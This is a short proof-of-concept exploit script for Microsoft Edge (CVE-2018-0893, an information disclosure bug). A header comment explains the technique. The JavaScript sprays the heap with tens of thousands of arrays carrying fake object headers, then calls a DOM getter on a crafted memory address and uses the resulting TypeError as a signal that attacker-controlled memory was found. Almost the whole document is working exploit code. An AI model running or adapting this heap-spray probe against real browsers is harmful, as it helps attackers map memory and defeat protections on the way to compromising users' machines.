<script>

/*

Proof-of-concept exploit: Microsoft Edge CVE-2018-0893 information disclosure

Concept: In EntrySimpleSlotGetter there is a code path that will throw a TypeError instead of crashing, in case that it finds a particular shape at the `this` memory address (eg. an object of an unsupported type). This can be leveraged as a signaling channel allowing determine the state of the heap, eg. if a heap spray was successful and/or if there exists a Javascript object at the provided memory location. 

Tested: Microsoft Edge on Windows 10 RS3 x32, Nov.2017

*/


alert("starting")

function spray() {
  var arrobj = new ArrayBuffer(4);
  var num_arrays = 98688;
  var arr_size = (0x1000 - 0x20)/4;

  var arr_arr = new Array( num_arrays );

  var decl = "[";

  for ( var i = 0; i < arr_size - 1; ++ i ) {
    decl += '0,';
  }

  decl += '0';
  decl += ']';

  for ( var i = 0; i < num_arrays; ++ i ) {
    arr_arr[i] = eval(decl);
    arr_arr[i][0] = 0x1b302000;  // create a fake object to trigger TypeError
    arr_arr[i][1] = 0x1b30201a;  
    arr_arr[i][2] = 0x1a
    arr_arr[i][4] = 0x3
  }
}


spray()
alert("Heap spray done")

try { 
  // this will crash if we failed to control the memory at 0x1a1b3010
  var o = window.__lookupGetter__('defaultStatus').call(0x1a1b3010 >> 1) 
}
catch (e) {
  // alert(e) // TypeError: DOM object: argument is not an object
  alert("Heap spray successful, found the faked object at 0x1a1b3011")
} 

alert(o.toString())

</script>
